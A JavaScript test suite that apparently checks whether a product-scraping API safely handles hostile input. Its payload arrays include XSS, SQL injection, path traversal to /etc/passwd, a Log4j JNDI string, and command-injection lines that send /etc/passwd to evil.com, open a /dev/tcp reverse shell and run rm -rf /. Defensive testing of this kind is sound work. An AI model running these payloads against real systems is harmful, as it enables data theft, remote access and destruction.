/**
 * Security and Input Validation Test Suite
 * Comprehensive testing for security vulnerabilities and input validation edge cases
 * 
 * Test Coverage:
 * - Input sanitization and validation
 * - Cross-Site Scripting (XSS) prevention
 * - SQL Injection prevention
 * - Command injection prevention
 * - Path traversal prevention
 * - Rate limiting and abuse prevention
 * - Header injection prevention
 * - Malformed request handling
 * - Buffer overflow protection
 * - Denial of Service (DoS) protection
 */

import { test, expect, describe, beforeEach, afterEach } from 'bun:test';
const request = require('supertest');
const { app } = require('../server');

describe('Security and Input Validation', () => {
  
  describe('Cross-Site Scripting (XSS) Prevention', () => {
    
    test('should sanitize XSS in keyword parameters', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        '<svg onload=alert("xss")>',
        'javascript:alert("xss")',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<form><input type="image" src=x onerror=alert(1)>',
        '"><script>alert("xss")</script>',
        '\'><script>alert("xss")</script>',
        '<scr<script>ipt>alert("xss")</scr</script>ipt>',
        '<SCRIPT>alert("xss")</SCRIPT>',
        '<ScRiPt>alert("xss")</ScRiPt>',
        'alert("xss")',
        'window.location="http://evil.com"',
        'document.cookie="stolen"'
      ];

      for (const payload of xssPayloads) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: payload });

        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        
        // Response should not contain executable script content
        const responseString = JSON.stringify(res.body);
        expect(responseString).not.toMatch(/<script[^>]*>/i);
        expect(responseString).not.toMatch(/javascript:/i);
        expect(responseString).not.toMatch(/onerror\s*=/i);
        expect(responseString).not.toMatch(/onload\s*=/i);
        
        // Keyword should be properly escaped in response
        expect(res.body.keyword).toBe(payload);
      }
    });

    test('should handle XSS in domain parameters', async () => {
      const xssDomains = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:alert("xss")',
        'file:///etc/passwd'
      ];

      for (const domain of xssDomains) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ 
            keyword: 'test',
            domain: domain 
          });

        // Should return error for invalid domain, not execute script
        expect(res.status).toBe(400);
        expect(res.body.success).toBe(false);
        expect(res.body.error).toContain('Unsupported Amazon domain');
        
        // Response should not contain executable content
        const responseString = JSON.stringify(res.body);
        expect(responseString).not.toMatch(/<script[^>]*>/i);
        expect(responseString).not.toMatch(/javascript:/i);
      }
    });
  });

  describe('SQL Injection Prevention', () => {
    
    test('should handle SQL injection attempts in keywords', async () => {
      const sqlPayloads = [
        "'; DROP TABLE products; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' OR 'a'='a",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "1'; EXEC xp_cmdshell('dir'); --",
        "'; WAITFOR DELAY '00:00:10'; --",
        "' OR SLEEP(5) --",
        "' OR pg_sleep(5) --",
        "1' OR '1'='1' /*",
        "x'; DROP DATABASE test; --",
        "' HAVING 1=1 --",
        "' GROUP BY password HAVING 1=1 --",
        "' ORDER BY 1 --"
      ];

      for (const payload of sqlPayloads) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: payload });

        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        
        // Should treat SQL injection as normal search term
        expect(res.body.keyword).toBe(payload);
        
        // Response should be normal API response, not database error
        expect(res.body).toHaveProperty('products');
        expect(Array.isArray(res.body.products)).toBe(true);
      }
    });

    test('should prevent SQL injection in domain parameters', async () => {
      const sqlDomains = [
        "amazon.com'; DROP TABLE domains; --",
        "amazon.com' OR '1'='1",
        "'; SELECT * FROM sensitive_data; --"
      ];

      for (const domain of sqlDomains) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ 
            keyword: 'test',
            domain: domain 
          });

        expect(res.status).toBe(400);
        expect(res.body.success).toBe(false);
        expect(res.body.error).toContain('Unsupported Amazon domain');
      }
    });
  });

  describe('Command Injection Prevention', () => {
    
    test('should prevent command injection in keywords', async () => {
      const commandPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '& whoami',
        '&& rm -rf /',
        '|| curl http://evil.com',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        '; ping -c 10 127.0.0.1',
        '| nc -l 4444',
        '; wget http://evil.com/malware',
        '`whoami`',
        '$(whoami)',
        '; sleep 10',
        '| sleep 10',
        '&& sleep 10',
        '|| sleep 10',
        '${IFS}cat${IFS}/etc/passwd',
        '; curl -X POST http://evil.com --data @/etc/passwd',
        '| bash -i >& /dev/tcp/evil.com/4444 0>&1'
      ];

      for (const payload of commandPayloads) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: payload });

        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        
        // Should treat command injection as normal search term
        expect(res.body.keyword).toBe(payload);
        
        // Response should be normal, not result of command execution
        expect(res.body).toHaveProperty('products');
        expect(Array.isArray(res.body.products)).toBe(true);
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    
    test('should prevent directory traversal in keywords', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc//passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam',
        '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '\\..\\..\\..\\etc\\passwd',
        '/var/log/../../../etc/passwd',
        'file:///etc/passwd',
        'file://c:\\windows\\system32\\config\\sam',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd'
      ];

      for (const payload of pathTraversalPayloads) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: payload });

        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        
        // Should treat path traversal as normal search term
        expect(res.body.keyword).toBe(payload);
        
        // Should not expose file system contents
        expect(res.body).toHaveProperty('products');
        expect(Array.isArray(res.body.products)).toBe(true);
      }
    });
  });

  describe('Header Injection Prevention', () => {
    
    test('should prevent HTTP response splitting', async () => {
      const headerInjectionPayloads = [
        'test\\r\\nSet-Cookie: malicious=true',
        'test\\r\\nLocation: http://evil.com',
        'test\\n\\nHTTP/1.1 200 OK\\r\\nContent-Length: 0\\r\\n\\r\\n',
        'test\\r\\nContent-Type: text/html\\r\\n\\r\\n<script>alert("xss")</script>',
        'test%0d%0aSet-Cookie:%20malicious=true',
        'test%0aLocation:%20http://evil.com',
        'test\\r\\nX-Forwarded-For: 127.0.0.1'
      ];

      for (const payload of headerInjectionPayloads) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: payload });

        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        
        // Check that malicious headers are not injected
        expect(res.headers['set-cookie']).toBeUndefined();
        expect(res.headers['location']).toBeUndefined();
        expect(res.headers['x-forwarded-for']).toBeUndefined();
        
        // Response should be normal JSON
        expect(res.headers['content-type']).toMatch(/application\/json/);
      }
    });

    test('should handle malicious User-Agent headers', async () => {
      const maliciousUserAgents = [
        '<script>alert("xss")</script>',
        'Mozilla/5.0 (compatible; sqlmap/1.0)',
        'curl/7.0 (command injection test)',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/malware}'
      ];

      for (const userAgent of maliciousUserAgents) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: 'test' })
          .set('User-Agent', userAgent);

        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        
        // Should handle malicious User-Agent gracefully
        expect(res.body).toHaveProperty('products');
      }
    });
  });

  describe('Rate Limiting and Abuse Prevention', () => {
    
    test('should handle rapid successive requests', async () => {
      const rapidRequests = 20;
      const requests = [];
      const startTime = Date.now();

      // Send many requests quickly
      for (let i = 0; i < rapidRequests; i++) {
        requests.push(
          request(app)
            .get('/api/scrape')
            .query({ keyword: `rapid-${i}` })
            .timeout(5000)
        );
      }

      const responses = await Promise.allSettled(requests);
      const duration = Date.now() - startTime;
      
      const successful = responses.filter(r => 
        r.status === 'fulfilled' && r.value.status === 200
      );
      const failed = responses.filter(r => 
        r.status === 'rejected' || r.value.status !== 200
      );

      console.log(`Rate Limiting Test Results:`);
      console.log(`- Rapid requests: ${rapidRequests}`);
      console.log(`- Successful: ${successful.length}`);
      console.log(`- Failed: ${failed.length}`);
      console.log(`- Duration: ${duration}ms`);

      // Should handle requests but may apply rate limiting
      expect(successful.length).toBeGreaterThan(0);
      expect(successful.length + failed.length).toBe(rapidRequests);
    });

    test('should handle requests with suspicious patterns', async () => {
      const suspiciousKeywords = [
        'A'.repeat(10000), // Very long keyword
        Array(100).fill('test').join(' '), // Many repeated terms
        '🤖'.repeat(1000), // Many robot emojis
        'hack test exploit vulnerability',
        'SELECT * FROM products WHERE 1=1',
        '<script>while(true){}</script>', // Infinite loop attempt
        '${jndi:ldap://evil.com/malware}', // Log4j exploit attempt
        '../../../proc/version', // System info attempt
        'curl -X POST http://evil.com' // Command injection attempt
      ];

      for (const keyword of suspiciousKeywords) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword });

        // Should handle suspicious input gracefully
        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        expect(res.body.keyword).toBe(keyword);
      }
    });
  });

  describe('Buffer Overflow and Memory Exhaustion Protection', () => {
    
    test('should handle extremely large payloads', async () => {
      const sizes = [
        1024,      // 1KB
        10240,     // 10KB
        102400,    // 100KB
        1048576    // 1MB
      ];

      for (const size of sizes) {
        const largePayload = 'A'.repeat(size);
        const startTime = Date.now();

        try {
          const res = await request(app)
            .get('/api/scrape')
            .query({ keyword: largePayload })
            .timeout(10000);

          const duration = Date.now() - startTime;

          console.log(`Large Payload Test (${size} bytes): ${duration}ms`);
          
          expect(res.status).toBe(200);
          expect(res.body.success).toBe(true);
          expect(res.body.keyword).toBe(largePayload);
          
          // Should complete within reasonable time even with large payload
          expect(duration).toBeLessThan(15000); // 15 seconds max
        } catch (error) {
          // If request fails due to size limits, that's acceptable
          expect(error.message).toMatch(/timeout|payload|size/i);
        }
      }
    });

    test('should handle malformed Unicode sequences', async () => {
      const malformedUnicodePayloads = [
        '\uD800', // Unpaired high surrogate
        '\uDFFF', // Unpaired low surrogate
        '\uD800\uD800', // Two high surrogates
        '\uDC00\uDC00', // Two low surrogates
        'valid\uD800invalid', // Invalid in middle
        '\uFFFE', // Byte order mark
        '\uFFFF', // Invalid character
        '\u0000', // Null character
        '\u001F', // Control character
        String.fromCharCode(0xD800, 0xD800), // Invalid surrogate pair
        Buffer.from([0xED, 0xA0, 0x80]).toString(), // Invalid UTF-8
        Buffer.from([0xED, 0xBF, 0xBF]).toString()  // Invalid UTF-8
      ];

      for (const payload of malformedUnicodePayloads) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: payload });

        // Should handle malformed Unicode gracefully
        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        
        // Response should be valid JSON
        expect(res.body).toHaveProperty('keyword');
        expect(res.body).toHaveProperty('products');
      }
    });
  });

  describe('Content-Type and MIME Type Validation', () => {
    
    test('should reject non-GET requests with appropriate methods', async () => {
      const methods = ['POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];

      for (const method of methods) {
        const res = await request(app)
          [method.toLowerCase()]('/api/scrape')
          .send({ keyword: 'test' });

        // Should reject non-GET methods or handle appropriately
        expect([404, 405, 501]).toContain(res.status);
      }
    });

    test('should handle malicious Content-Type headers', async () => {
      const maliciousContentTypes = [
        'text/html; charset=<script>alert("xss")</script>',
        'application/json; boundary=../../etc/passwd',
        'multipart/form-data; boundary=--malicious',
        'text/plain; charset=../../../etc/passwd',
        'application/x-www-form-urlencoded; charset=utf-7',
        'image/svg+xml; charset=utf-8' // Potentially dangerous SVG
      ];

      for (const contentType of maliciousContentTypes) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: 'test' })
          .set('Content-Type', contentType);

        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        
        // Response should always be JSON regardless of request content-type
        expect(res.headers['content-type']).toMatch(/application\/json/);
      }
    });
  });

  describe('Authentication and Authorization Edge Cases', () => {
    
    test('should handle missing authentication gracefully', async () => {
      // The API currently doesn't require authentication, 
      // but should handle auth-related headers gracefully
      
      const authHeaders = {
        'Authorization': 'Bearer invalid-token',
        'X-API-Key': 'invalid-key',
        'X-Auth-Token': 'malicious-token',
        'Cookie': 'session=../../../etc/passwd'
      };

      for (const [header, value] of Object.entries(authHeaders)) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: 'test' })
          .set(header, value);

        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        
        // Should ignore auth headers and process normally
        expect(res.body).toHaveProperty('products');
      }
    });

    test('should handle authorization bypass attempts', async () => {
      const bypassAttempts = [
        { 'X-Original-URL': '/admin' },
        { 'X-Rewrite-URL': '/admin' },
        { 'X-Forwarded-Host': 'admin.evil.com' },
        { 'Host': 'admin.localhost' },
        { 'X-Real-IP': '127.0.0.1' },
        { 'X-Forwarded-For': '127.0.0.1' },
        { 'X-Remote-IP': '127.0.0.1' },
        { 'X-Originating-IP': '127.0.0.1' }
      ];

      for (const headers of bypassAttempts) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: 'test' })
          .set(headers);

        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        
        // Should not be affected by bypass attempts
        expect(res.body).toHaveProperty('products');
      }
    });
  });

  describe('Denial of Service Protection', () => {
    
    test('should handle resource exhaustion attempts', async () => {
      const resourceExhaustionPayloads = [
        'A'.repeat(1000000), // 1MB string
        '('.repeat(100000) + ')'.repeat(100000), // Nested parentheses
        'test' + '\\n'.repeat(100000), // Many newlines
        '🚀'.repeat(50000), // Many multi-byte Unicode
        Array(10000).fill('test').join(','), // CSV-like payload
        '<html>' + '<div>'.repeat(10000) + '</div>'.repeat(10000) + '</html>', // Nested HTML
        JSON.stringify({ key: 'value'.repeat(100000) }) // Large JSON-like string
      ];

      for (const payload of resourceExhaustionPayloads.slice(0, 3)) { // Test first 3 to avoid timeout
        const startTime = Date.now();
        
        try {
          const res = await request(app)
            .get('/api/scrape')
            .query({ keyword: payload.substring(0, 10000) }) // Limit size to prevent timeout
            .timeout(5000);

          const duration = Date.now() - startTime;

          expect(res.status).toBe(200);
          expect(res.body.success).toBe(true);
          
          // Should complete within reasonable time
          expect(duration).toBeLessThan(8000);
        } catch (error) {
          // Timeout is acceptable for DoS protection
          expect(error.message).toMatch(/timeout/i);
        }
      }
    });

    test('should handle algorithmic complexity attacks', async () => {
      const complexityAttacks = [
        'a'.repeat(1000) + 'b'.repeat(1000), // Pattern matching complexity
        '((((((((((test))))))))))', // Nested groups
        'test.*test.*test.*test.*test', // Regex complexity attempt
        'x'.repeat(5000) + 'y', // Worst case for some algorithms
        Array(100).fill('test test test').join(' OR ') // Boolean complexity
      ];

      for (const attack of complexityAttacks.slice(0, 2)) { // Test first 2
        const startTime = Date.now();
        
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: attack.substring(0, 1000) }) // Limit size
          .timeout(3000);

        const duration = Date.now() - startTime;

        expect(res.status).toBe(200);
        expect(res.body.success).toBe(true);
        
        // Should not cause algorithmic complexity issues
        expect(duration).toBeLessThan(5000);
      }
    });
  });

  describe('Error Message Information Disclosure', () => {
    
    test('should not expose sensitive information in error messages', async () => {
      const informationDisclosureAttempts = [
        '', // Empty keyword
        '   ', // Whitespace only
        null, // Null value attempt
        undefined, // Undefined attempt
        'very-long-' + 'A'.repeat(10000) + '-keyword' // Very long keyword
      ];

      for (const attempt of informationDisclosureAttempts) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: attempt });

        // Error messages should not expose internal details
        if (!res.body.success) {
          expect(res.body.error).not.toMatch(/stack trace|internal error|database|file path/i);
          expect(res.body.error).not.toMatch(/\\/.*\\//); // No file paths
          expect(res.body.error).not.toMatch(/C:\\|\/usr\/|\/home\//); // No system paths
          expect(res.body).not.toHaveProperty('stack');
          expect(res.body).not.toHaveProperty('details');
        }
      }
    });

    test('should handle malformed JSON in responses', async () => {
      // This test ensures the API always returns valid JSON
      // even when handling edge cases
      
      const edgeCases = [
        '"malformed json',
        "{'single': 'quotes'}",
        '{trailing: comma,}',
        '{"unicode": "\\uD800"}', // Invalid unicode
        '{"numbers": 123.456.789}' // Invalid number format
      ];

      for (const edgeCase of edgeCases) {
        const res = await request(app)
          .get('/api/scrape')
          .query({ keyword: edgeCase });

        expect(res.status).toBe(200);
        
        // Response should always be valid JSON
        expect(() => JSON.parse(JSON.stringify(res.body))).not.toThrow();
        expect(res.body).toHaveProperty('success');
        expect(res.body).toHaveProperty('keyword');
      }
    });
  });
});
